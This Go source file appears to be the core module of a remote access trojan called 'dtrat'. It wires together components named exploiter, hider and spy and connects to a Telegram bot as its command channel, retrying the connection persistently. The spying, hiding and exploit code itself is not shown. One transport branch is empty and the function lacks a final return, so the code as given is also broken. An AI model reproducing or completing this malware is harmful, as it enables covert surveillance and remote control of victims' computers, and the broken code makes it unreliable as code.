package rat

import (
	"dtrat/config"
	"dtrat/engine"
	"dtrat/exploiter"
	"dtrat/hider"
	"dtrat/spy"
	"dtrat/transport"
	"fmt"
	"time"
)

const ReconnectAttempts = 20

type Rat struct {
	Transport transport.Transport
	Engine    *engine.Engine
	Exploiter *exploiter.Exploiter
	Hider     *hider.Hider
	Spy       *spy.Spy

	Config  config.Config
	CloseCh chan (error)
}

func NewRat() (*Rat, error) {
	cfg, err := config.NewConfig()
	if err != nil {
		return nil, fmt.Errorf("NewConfig: %w", err)
	}

	var tl transport.Transport
	for range ReconnectAttempts {
		tl, err = choiceTransport(cfg)
		if err == nil {
			break
		}

		time.Sleep(30 * time.Second)
	}

	if err != nil {
		return nil, fmt.Errorf("choiceTransport: %w", err)
	}

	eng, err := engine.NewEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewEngine: %w", err)
	}

	exp, err := exploiter.NewExploiter()
	if err != nil {
		return nil, fmt.Errorf("NewExploiter: %w", err)
	}

	hdr, err := hider.NewHider(eng)
	if err != nil {
		return nil, fmt.Errorf("NewHider: %w", err)
	}

	spy, err := spy.NewSpy()
	if err != nil {
		return nil, fmt.Errorf("NewSpy: %w", err)
	}

	rat := Rat{
		Transport: tl,
		Engine:    eng,
		Exploiter: exp,
		Hider:     hdr,
		Spy:       spy,
		Config:    cfg,
		CloseCh:   make(chan error, 1),
	}

	return &rat, nil
}

func choiceTransport(cfg config.Config) (transport.Transport, error) {
	switch cfg.General.UseTransport {
	case "telegram":
		return transport.NewTgBot(cfg)
	case "arcanum":

	default:
		return nil, fmt.Errorf("неизвестный транспорт: %s", cfg.General.UseTransport)
	}
}
